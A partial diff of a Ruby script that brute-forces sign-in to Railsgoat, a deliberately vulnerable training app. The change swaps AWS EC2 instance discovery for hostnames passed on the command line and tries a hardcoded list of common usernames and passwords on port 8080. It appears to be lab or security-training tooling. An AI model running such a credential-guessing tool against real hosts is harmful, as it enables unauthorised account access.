@@ -1,49 +1,13 @@
-#! /bin/ruby
-require 'net/ssh'
+#!/usr/bin/ruby
 require 'net/http'
-require 'aws-sdk'
-
-
-if ENV['AWS_PROFILE']
-  puts "Using AWS_PROFILE = #{ENV['AWS_PROFILE']}"
-else
-  puts "AWS_PROFILE is empty, using 'default'"
-end
-profile = ENV['AWS_PROFILE']
-
-credentials = Aws::SharedCredentials.new(profile_name: ENV['AWS_PROFILE'])
-
-if ENV['AWS_REGION']
-  puts "Using AWS_REGION = #{ENV['AWS_REGION']}"
-else
-  puts "AWS_PROFILE is empty, using default 'us-west-2'"
-end
-region = ENV['AWS_REGION'] || 'us-west-2'
-
-client = Aws::EC2::Client.new(region: region, credentials: credentials)
-ec2_resp = client.describe_instances
-reservations = ec2_resp.reservations
-public_ips = []
-
-reservations.each do |reservation|
-  reservation.instances.each do |ec2|
-    public_ips << ec2.public_ip_address
-  end
-end
 
 usernames=["ec2-user","admin","username","johntheripper","master","hacker","admin@metacorp.com"]
 passwords=["ec2-user","admin","password","johntheripper","master","letmein","admin1234"]
-
-
 # Attempt brute force Railsgoat user sign in #
 
-public_ips.each do |public_ip|
-
-  usernames.each do |username|
-    i = 0
-    hostname = public_ip
-    username = username
-    password = passwords[i]
+ARGV.each do |hostname|
+  usernames.each_with_index do |username, index|
+    password = passwords[index]
     port = 8080
     time_out_limit = 1
 
@@ -71,10 +35,12 @@ public_ips.each do |public_ip|
       else
         puts "FAIL: No Railsgoat server"
       end
-
-    rescue Net::OpenTimeout => e
+    rescue Errno::ECONNREFUSED
+      puts "Could not connect to #{uri}"
+      break
+    rescue Net::OpenTimeout
      puts "FAIL: TIMED OUT after #{time_out_limit} seconds. No Railsgoat server"
+     break
     end
-    i += 1
   end
 end
